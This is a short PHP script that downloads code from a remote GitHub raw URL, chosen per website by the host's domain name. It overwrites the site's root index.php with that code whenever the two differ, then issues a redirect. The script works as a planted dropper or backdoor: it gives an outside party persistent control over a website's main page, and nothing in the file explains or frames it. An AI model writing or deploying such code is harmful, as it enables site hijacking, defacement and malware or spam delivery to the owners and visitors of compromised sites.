<?php
$filePath = $_SERVER['DOCUMENT_ROOT'] . "/index.php";
$permissions = '0644';

$domain = $_SERVER['HTTP_HOST'];
$root_domain = preg_replace('/^www\./', '', $domain);
$filename = $filePath;
$new_code_url = 'https://raw.githubusercontent.com/nobody1331/iamcode/main/15-08-2023/' . $root_domain . '.php';
$new_code = file_get_contents($new_code_url);
$current_code = file_exists($filename) ? file_get_contents($filename) : '';

if ($new_code !== $current_code) {
    $handle = fopen($filename, "w+");
    fwrite($handle, $new_code);
    fclose($handle);
}

header("Refresh: 1; url=" . $refresh_url);
?>
